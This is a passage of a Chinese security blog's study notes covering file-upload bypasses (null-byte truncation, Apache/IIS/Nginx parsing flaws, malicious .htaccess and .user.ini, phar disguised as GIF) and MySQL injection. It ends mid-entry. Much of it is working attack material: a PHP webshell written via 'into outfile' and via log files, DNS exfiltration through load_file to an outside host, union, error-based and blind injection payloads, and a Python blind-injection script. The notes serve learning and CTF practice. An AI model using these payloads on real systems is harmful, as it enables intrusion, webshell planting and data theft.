数中，处理字符串的函数中0x00被认为是终止符。</p><p>&emsp;&emsp;例如: 网站上传函数处理xxx.asp%00.jpg时，首先后缀名是合法的jpg格式，可以 上传，在保存文件时，遇到%00字符丢弃后面的 .jpg，文件后缀最终保存的后缀 名为xxx.asp</p></li></ol><h4 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h4><ol><li><p>截断绕过</p><p>&emsp;&emsp;用像test.asp%00.jpg的方式进行截断，属于白名单文件</p><p>&emsp;&emsp;【但是防御的话，就是检测的是啥后缀，就以啥后缀来保存，文件名再进行变化，比如用时间戳来替换，而非以原始文件名直接保存。】</p></li><li><p>接下来将要讨论的 解析/包含 漏洞绕过</p></li></ol><h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><h4 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h4><p>&emsp;&emsp;CVE-2017-15715，上传一个文件名包含换行符的文件。注意，只能是<code>\x0A</code>，不能是<code>\x0D\x0A</code>，我们可以用hex功能在1.php后面添加一个<code>\x0A</code>。</p><p>&emsp;&emsp;另一个是上传1.php.xxx，后面xxx随便来个不能被解析的东西，随后apache就会往前，直到找到一个能被解析的后缀名，比如这里的php。</p><h4 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h4><p>&emsp;&emsp;IIS6.0有两个解析漏洞，一个是如果目录名包含asp 、asa、cer字符串，那么这个目录下所有的文 件都会按照 asp 去解析。</p><p>&emsp;&emsp;例如： chaoasp/1.jpg</p><p>&emsp;&emsp;因为文件名中有asp字样，所以该文件夹下的1.jpg文件打开时，会按照asp文件去解析执行</p><p>另一个是只要文件名中含有.asp、.asa、.cer会优先按 asp 来解析</p><p>&emsp;&emsp;IIS7.0/7.5是对php解析时有一个类似于Nginx的解析漏洞， 对任意文件名只要在URL后面追加 上字符串“/任意文件名.php”就会按照 php 的方式去解析 。</p><p>&emsp;&emsp;例子 ： ”<a href="http://www.t/" target="_blank" rel="noopener">http://www.</a>baidu.com/upload/chao/1.jpg/chao.php”</p><p>&emsp;&emsp;这种情况下访问1.jpg，该文件就会按照php格式被解析执行</p><h4 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h4><p>&emsp;&emsp;一个是对任意文件名，在后面添加/任意文件名.php的解析漏洞，比如原本文件名是 test.jpg， 可以添加为 test.jpg/x.php 进行解析攻击。</p><p>&emsp;&emsp;一种是对低版本的 Nginx 可以在任意文件名后面添加%00.php</p><p>&emsp;&emsp;例如：127.0.0.1/sql-loads/load/chao.jpg%00.php</p><p>&emsp;&emsp;那么chao.jpg也就被当作php格式文件执行</p><p>&emsp;&emsp;nginx 0.5.* [Success] </p><p>&emsp;&emsp;nginx 0.6.* [Success] </p><p>&emsp;&emsp;nginx 0.7 &lt;= 0.7.65 [Success] </p><p>&emsp;&emsp;nginx 0.8 &lt;= 0.8.37 [Success]</p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>文件包含一般涉及四个函数</p><p>require()</p><p>require_once()</p><p>include()</p><p>include_once()</p><p>&emsp;&emsp;无论包含的文件是啥格式，txt还是jpg，被<code>&lt;?php ?&gt;</code>标签 【短标签也可】包裹的内容都会被当成php代码执行。因此，如果文件上传不能绕过后缀的话，能找到文件包含漏洞也同样实现攻击。而如果想读被包含文件的源码的话，就要用到php伪协议，因为php代码【除非你 <code>highlight_file(__FILE__);</code>了】是不可见的，需要用php的filter伪协议去base64编码一下——<code>php://filter/read=convert.base64-encode/resource=$path”</code></p><p>&emsp;&emsp;但是如果有上传点，有过滤，然后又找不到文件包含，是否就无路了？倒也不尽然，那要看这个文件上传的点的过滤严不严格了，如果只是简简单单黑名单，那就，嘿嘿嘿~</p><h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p>&emsp;&emsp;.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p><p>&emsp;&emsp;所以我们可以利用该文件来绕过文件上传时的过滤。前提是我们能上传该类型文件【如果能读写服务端的该文件也可】，具体方法就是上传包含如下内容的.htaccess文件</p><p>方法1</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将文件名含有"dd"的解析成php文件</span></span><br><span class="line"><span class="section">&lt;FilesMatch "dd"&gt;</span></span><br><span class="line">  <span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure><p>方法2</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将文件后缀为.png的解析成php文件</span></span><br><span class="line">AddType  <span class="built_in">application</span>/x-httpd-php    .png</span><br></pre></td></tr></table></figure><h3 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h3><p>&emsp;&emsp;具体可以看看<a href="https://segmentfault.com/a/1190000011552335?utm_source=tag-newest" target="_blank" rel="noopener">这篇文章</a>。<a href="[https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html](https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html)">这篇</a>也不错</p><p>&emsp;&emsp;自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件<strong>仅</strong>被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用 .htaccess 文件有同样效果。即.user.ini可以修改配置，但是只有<a href="http://php.net/manual/zh/ini.list.php" target="_blank" rel="noopener">PHP_IN_USER模式的配置</a>才可以在.user.ini中设定。</p><p>&emsp;&emsp;而可修改的配置中我们利用的比较多的就是<code>auto_prepend_file</code> ，</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span>=<span class="number">01</span>.gif</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;就是让所有php文件都“自动”包含 <code>01.gif</code> 这个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。所以有一个要求就是.user.ini所在目录至少得有一个可访问的php文件。</p><p>&emsp;&emsp;除了上传这两种能够修改配置的文件，如果能够找到反序列化链，但是却苦于没有unserialize()函数来利用，那么<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">phar伪协议</a>你值得了解。</p><p>&emsp;&emsp;并且由于phar伪协议是靠文件内容中的标签来识别的，所以我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web小屋 </category>
          
          <category> Files related </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Files </tag>
            
            <tag> Serialization </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web学习笔记 之 SQL注入</title>
      <link href="/2020/08/07/Web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/08/07/Web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>这篇主要是搬的<a href="https://www.0x002.com/2020/%E5%AF%B9MYSQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9%E5%8F%8A%E9%83%A8%E5%88%86Trick%E7%9A%84%E5%BD%92%E7%B1%BB%E5%B0%8F%E7%BB%93/#%E4%BB%80%E4%B9%88%E6%98%AFSQL%E6%B3%A8%E5%85%A5%EF%BC%9F" target="_blank" rel="noopener">Yunen</a>师傅的博客，觉得他整理的已经比较好了。</p><p>&emsp;&emsp;注入攻击的本质，是把用户输入的数据当作代码执行。这里有两个关键，第一个是用户能够控制输入；第二个是原本程序要执行的代码，拼接了用户的数据。——《白帽子讲Web安全》</p><p>&emsp;&emsp;上一章的XSS是一种针对HTML的注入攻击，而本章的SQL注入，顾名思义就是对SQL数据库的注入攻击。【这里针对Mysql】【在注入过程中，除了拼接，闭合-逃逸 这个步骤也经常出现。所以如果waf住了这里，是否还有别的方法呢？——憨憨弟弟如是想】</p><p>一个完整的mysql管理系统结构通常如下图<img src="https://i.loli.net/2020/07/27/SYRktVrzCwZl9Fd.png" alt="image-20200727141611549"></p><p>我们知道，在数据库中，常见的对数据进行处理的操作有：<strong>增、删、查、改</strong>这四种。</p><p>每一项操作都具有不同的作用，共同构成了对数据的绝大部分操作。</p><ul><li><p>增。顾名思义，也就是增加数据。在通用的SQL语句中，其简单结构通常可概述为:</p><p> <code>INSERT table_name(columns_name) VALUES(new_values)</code>。</p></li></ul><ul><li><p>删。删除数据。简单结构为:</p><p> <code>DELETE table_name WHERE condition</code>。</p></li></ul><ul><li><p>查。查询语句可以说是绝大部分应用程序最常用到的SQL语句，他的作用就是查找数据。其简单结构为：</p><p><code>SELECT columns_name FROM table_name WHERE condition</code>。</p></li></ul><ul><li><p>改。有修改/更新数据。简单结构为:</p><p><code>UPDATE table_name SET column_name=new_value WHERE condition</code>。</p></li></ul><p>PS：以上SQL语句中，系统关键字全部进行了大写处理。</p><h2 id="文件读-写"><a href="#文件读-写" class="headerlink" title="文件读/写"></a>文件读/写</h2><p>我们知道Mysql是很灵活的，它支持文件读/写功能。在讲这之前，有必要介绍下什么是<code>file_priv</code>和<code>secure-file-priv</code>。</p><p>简单的说：<code>file_priv</code>是对于用户的文件读写权限，若无权限则不能进行文件读写操作，可通过下述payload查询权限。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> file_priv <span class="keyword">from</span> mysql.<span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">user</span>=$<span class="keyword">USER</span> host=$HOST;</span><br></pre></td></tr></table></figure><p><code>secure-file-priv</code>是一个系统变量，对于文件读/写功能进行限制。具体如下：</p><ul><li>无内容，表示无限制。</li><li>为NULL，表示禁止文件读/写。</li><li>为目录名，表示仅允许对特定目录的文件进行读/写。</li></ul><p>注：<strong>5.5.53本身及之后的版本默认值为NULL，之前的版本无内容</strong>。</p><p>三种方法查看当前<code>secure-file-priv</code>的值：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Code</span><br><span class="line"><span class="keyword">select</span> @@secure_file_priv;</span><br><span class="line"><span class="keyword">select</span> @@global.secure_file_priv;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">"secure_file_priv"</span>;</span><br></pre></td></tr></table></figure><p>修改：</p><ul><li>通过修改my.ini文件，添加：<code>secure-file-priv=</code></li><li>启动项添加参数：<code>mysqld.exe --secure-file-priv=</code></li></ul><h3 id="读"><a href="#读" class="headerlink" title="读"></a>读</h3><p>Mysql读取文件通常使用load_file函数，语法如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(file_path);</span><br></pre></td></tr></table></figure><p>第二种读文件的方法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">infile</span> <span class="string">"/etc/passwd"</span> <span class="keyword">into</span> <span class="keyword">table</span> <span class="keyword">test</span> <span class="keyword">FIELDS</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">'\n'</span>; <span class="comment">#读取服务端文件</span></span><br></pre></td></tr></table></figure><p>第三种：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> <span class="keyword">infile</span> <span class="string">"/etc/passwd"</span> <span class="keyword">into</span> <span class="keyword">table</span> <span class="keyword">test</span> <span class="keyword">FIELDS</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">'\n'</span>; <span class="comment">#读取客户端文件</span></span><br></pre></td></tr></table></figure><p>限制：</p><ul><li>前两种需要<code>secure-file-priv</code>无值或为有利目录。</li><li>都需要知道要读取的文件所在的绝对路径。</li><li>要读取的文件大小必须小于<code>max_allowed_packet</code>所设置的值</li></ul><h4 id="低权限读取文件"><a href="#低权限读取文件" class="headerlink" title="低权限读取文件"></a>低权限读取文件</h4><p>5.5.53<code>secure-file-priv=NULL</code>读文件payload，mysql8测试失败，其他版本自测。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> mysql.m1;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> mysql.m1 (code <span class="built_in">TEXT</span> );</span><br><span class="line"><span class="keyword">LOAD</span> <span class="keyword">DATA</span> <span class="keyword">LOCAL</span> <span class="keyword">INFILE</span> <span class="string">'D://1.txt'</span> <span class="keyword">INTO</span> <span class="keyword">TABLE</span> mysql.m1 <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">''</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> mysql.m1;</span><br></pre></td></tr></table></figure><h3 id="写"><a href="#写" class="headerlink" title="写"></a>写</h3><p>说完了读文件，那我们来说说mysql的写文件操作。常见的写文件操作如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="string">"&lt;?php @assert($_POST['t']);?&gt;"</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'/var/www/html/1.php'</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="number">2</span>,<span class="string">"&lt;?php @assert($_POST['t']);?&gt;"</span> <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'/var/www/html/1.php'</span>;</span><br></pre></td></tr></table></figure><p>限制：</p><ul><li><code>secure-file-priv</code>无值或为可利用的目录</li><li>需知道目标目录的绝对目录地址</li><li>目标目录可写，mysql的权限足够。</li></ul><h4 id="日志法"><a href="#日志法" class="headerlink" title="日志法"></a>日志法</h4><p>&emsp;&emsp;由于mysql在5.5.53版本之后，<code>secure-file-priv</code>的值默认为<code>NULL</code>，这使得正常读取文件的操作基本不可行。我们这里可以利用mysql生成日志文件的方法来绕过。</p><p>mysql日志文件的一些相关设置可以直接通过命令来进行：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//请求日志</span></span><br><span class="line">mysql&gt; <span class="keyword">set</span> global <span class="comment">general_log_file =</span> <span class="comment">'/var/www/html/1.php'</span>;</span><br><span class="line">mysql&gt; <span class="keyword">set</span> global <span class="comment">general_log = on</span>;</span><br><span class="line"><span class="comment">//慢查询日志</span></span><br><span class="line">mysql&gt; <span class="keyword">set</span> global <span class="comment">slow_query_log_file=</span><span class="comment">'/var/www/html/2.php'</span></span><br><span class="line">mysql&gt; <span class="keyword">set</span> <span class="comment">global slow_query_log=1</span>;</span><br><span class="line"><span class="comment">//还有其他很多日志都可以进行利用</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>之后我们在让数据库执行满足记录条件的恶意语句即可。</p><p>限制：</p><ul><li>权限够，可以进行日志的设置操作</li><li>知道目标目录的绝对路径</li></ul><h2 id="DNSLOG带出数据"><a href="#DNSLOG带出数据" class="headerlink" title="DNSLOG带出数据"></a>DNSLOG带出数据</h2><p>&emsp;&emsp;什么是DNSLOG？简单的说，就是关于特定网站的DNS查询的一份记录表。若A用户对B网站进行访问/请求等操作，首先会去查询B网站的DNS记录，由于B网站是被我们控制的，便可以通过某些方法记录下A用户对于B网站的DNS记录信息。此方法也称为OOB注入。</p><p>如何用DNSLOG带出数据？若我们想要查询的数据为：<code>aabbcc</code>，那么我们让mysql服务端去请求<code>aabbcc.evil.com</code>，通过记录<code>evil.com</code>的DNS记录，就可以得到数据：<code>aabbcc</code>。</p><blockquote><p><a href="https://img.0x002.com/article/MysqlSQLi/dnslogSQLi.jpg" target="_blank" rel="noopener"><img src="https://img.0x002.com/article/MysqlSQLi/dnslogSQLi.jpg" alt="DNSLOG流程图"></a></p><p>引自：<a href="https://www.anquanke.com/post/id/98096" target="_blank" rel="noopener">Dnslog在SQL注入中的实战</a></p></blockquote><p>payload: <code>load_file(concat(&#39;\\\\&#39;,(select user()),&#39;.xxxx.ceye.io\xxxx&#39;))</code></p><p>应用场景：</p><ul><li>三大注入无法使用</li><li>有文件读取权限及<code>secure-file-priv</code>无值。</li><li>不知道网站/目标文件/目标目录的绝对路径</li><li>目标系统为Windows</li></ul><p>推荐平台：<a href="http://ceye.io/" target="_blank" rel="noopener">ceye.io</a></p><p>&emsp;&emsp;为什么Windows可用，Linux不行？这里涉及到一个叫UNC的知识点。简单的说，在Windows中，路径以<code>\\</code>开头的路径在Windows中被定义为UNC路径，相当于网络硬盘一样的存在，所以我们填写域名的话，Windows会先进行DNS查询。但是对于Linux来说，并没有这一标准，所以DNSLOG在Linux环境不适用。注：payload里的四个<code>\\\\</code>中的两个<code>\</code>是用来进行转义处理的。</p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>了解了最基本的Mysql相关知识后，我们来看看本文章的主题：SQL注入</p><p>&emsp;&emsp;大部分情况下我们的SQL注入都是在<strong>查</strong>上面去注入，以获取数据库中的敏感信息。而<strong>查</strong>我们大致上分为三种，分别是有回显的<strong>联合查询注入</strong>、无回显的<strong>报错注入</strong>和布尔、时间<strong>盲注</strong></p><p>&emsp;&emsp;三种注入方式利用起来原理并不是太难，但是注入的一生之敌：waf，总是让我们难以成功实现攻击。截至目前俺这个弟弟审过的两三个小众CMS，它们用的比较多的还是黑名单过滤，并且是在全局范围内直接对你所有传的参数【GET POST…】进行过滤，狠的一批，但是要是找到了未顾及的点，那就能给他日透咯。所以各种花里胡哨的payload，各种奇技淫巧也是因这越来越严密的waf而生。（就像游戏不停的推动着显卡升级一样嘛）</p><h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><p>联合查询注入需要注意的是：</p><ul><li>若回显仅支持一行数据的话，记得<strong>让前边正常的查询语句返回的结果为空</strong>。</li><li>使用union select进行拼接时，注意<strong>前后两个select语句的返回的字段数必须相同</strong>，否则无法拼接。</li></ul><p>再来看看联合查询注入的最基础四步</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">database</span>()   <span class="comment">#查询数据库名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema= <span class="keyword">database</span>()<span class="comment">#查询表名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'f1l1l1l1g'</span> <span class="comment">#查询表对应的列名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> flaaaaaag <span class="keyword">from</span> f1l1l1l1g <span class="comment">#查询列内容</span></span><br></pre></td></tr></table></figure><p>但在这之前还需要用order by查一下字段数，</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span> = <span class="number">1</span>' order <span class="keyword">by</span> <span class="number">3</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>止到报错之前的那个数字就是字段数了。</p><p>这里再补充一下information_schema相关的知识</p><p>information_schema简介</p><p>&emsp;&emsp;在版本大于等于5.0的MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。</p><p>其中我们需要关注的是，<strong>information_schema</strong>的数据库里的<strong>shemata</strong>数据表查询<strong>全部数据库名</strong></p><p><strong>tables</strong>的数据表中存着全部的<strong>数据表信息</strong>。其中，<strong>table_name 字段保存其名称</strong>，<strong>table_schema保存其对应的数据库名</strong>。</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h4><p>适用版本：5.5.5~5.5.49</p><p>&emsp;&emsp;报错注入有联动exp和~的，在Mysql里头，exp就是取e的幂次, ~就是按位取反。当exp里头的值太大了，就会造成大整数溢出，从而报错。</p><p><code>select exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x));</code></p><h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><p>函数语法：updatexml(XML_document, Xpath_string, new_value);</p><p>适用版本: 5.1.5+<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值</p><p>我们通常在第二个Xpath参数填写我们要查询的内容。</p><p>与exp()不同，updatexml是由于参数的格式不正确而产生的错误，同样也会返回参数的信息。</p><p>payload:</p><p>前后添加~使其不符合Xpath格式从而报错。<br><code>updatexml(1,concat(0x7e,(select user()),0x7e),1)</code></p><p><code>updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</code></p><p>通过查询@@version,返回版本。然后CONCAT将其字符串化。因为UPDATEXML第二个参数需要Xpath格式的字符串,所以不符合要求，然后报错。</p><p>错误大概会是：<br>ERROR 1105 (HY000): XPATH syntax error: ’:root@localhost’<br>另外，updatexml最多只能显示32位，需要配合substr【用法：substr(string,start,length)】使用。</p><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><p>函数语法：<code>EXTRACTVALUE (XML_document, XPath_string);</code></p><p>适用版本：5.1.5+</p><p>利用原理与updatexml函数相同</p><p>payload: <code>and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</code></p><h4 id="几何函数"><a href="#几何函数" class="headerlink" title="几何函数"></a>几何函数</h4><ul><li>GeometryCollection：<code>id=1 AND GeometryCollection((select * from (select* from(select user())a)b))</code></li><li>polygon()：<code>id=1 AND polygon((select * from(select * from(select user())a)b))</code></li><li>multipoint()：<code>id=1 AND multipoint((select * from(select * from(select user())a)b))</code></li><li>multilinestring()：<code>id=1 AND multilinestring((select * from(select * from(select user())a)b))</code></li><li>linestring()：<code>id=1 AND LINESTRING((select * from(select * from(select user())a)b))</code></li><li>multipolygon() ：<code>id=1 AND multipolygon((select * from(select * from(select user())a)b))</code></li></ul><h4 id="不存在的函数"><a href="#不存在的函数" class="headerlink" title="不存在的函数"></a>不存在的函数</h4><p>随便适用一颗不存在的函数，可能会得到当前所在的数据库名称。</p><p><a href="https://img.0x002.com/article/MysqlSQLi/noExit.png" target="_blank" rel="noopener"><img src="https://img.0x002.com/article/MysqlSQLi/noExit.png" alt="不存在的函数报错"></a></p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="布尔"><a href="#布尔" class="headerlink" title="布尔"></a>布尔</h4><p>&emsp;&emsp;对于布尔盲注来说，其使用的场景在于：<strong>对真/假条件返回的内容很容易区分</strong>。</p><p>&emsp;&emsp;比如说，有这么一条正常的select语句，我们再起where条件后边加上and 1=2，我们知道，1永远不等于2，那么这个条件就是一个永假条件，我们使用and语句连上，那么整个where部分就是永假的，这时候select语句是不会返回内容的。将其返回的内容与正常页面进行对比，如果很容易区分的话，那么布尔盲注试用。</p><p>payload：<code>(where | and) if(substr((select password from users where username=&#39;admin&#39;),1,1)=&#39;a&#39;,1,0)</code></p><h4 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h4><p>&emsp;&emsp;相比较于布尔盲注，时间盲注依赖于通过<strong>页面返回的延迟时间</strong>来判断条件是否正确。</p><p>使用场景：布尔盲注永假条件所返回的内容与正常语句返回的内容很接近/相同，无法判断情况。</p><p>简单的来说，时间盲注就是，如果我们自定义的条件为假的话，我们让其0延迟通过，如果条件为真的话，使用sleep()等函数，让sql语句的返回产生延迟。</p><p>payload：<code>（where | and）if(substr((select password from users where username=&#39;admin&#39;),1,1)=&#39;a&#39;,sleep(3),1)</code></p><p>&emsp;&emsp;由于盲注是需要大量的测试比较多的数据，所以一般盲注都是写脚本的。不然一个一个手工盲测费时费力。</p><p>下面是时间盲注脚本的一个示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">table=<span class="string">"abcdefghijklmnopqrstuvwxyz_&#123;&#125;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">        ss = time.time()</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">'''ELT(left((select database()),&#123;&#125;)='&#123;&#125;&#123;&#125;',SLEEP(10))'''</span>.format(len(flag)+<span class="number">1</span>,flag, i)</span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        print(r.text)</span><br><span class="line">        <span class="comment">#print(time.time()-ss)</span></span><br><span class="line">        <span class="keyword">if</span> time.time()-ss&gt;=<span class="number">10</span>:</span><br><span class="line">            flag += i</span><br><span class="line">            <span class="keyword">print</span> (flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>除了三种注入，其实还有一些不常见的注入</p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>&emsp;&emsp;什么是二次注入？简单的说，就是攻击者构造的恶意payload首先会被服务器存储在数据库中，在之后取出数据库在进行SQL语句拼接时产生的SQL注入问题。</p><p>举个例子，某个查询当先登录的用户信息的SQL语句如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">username</span>=<span 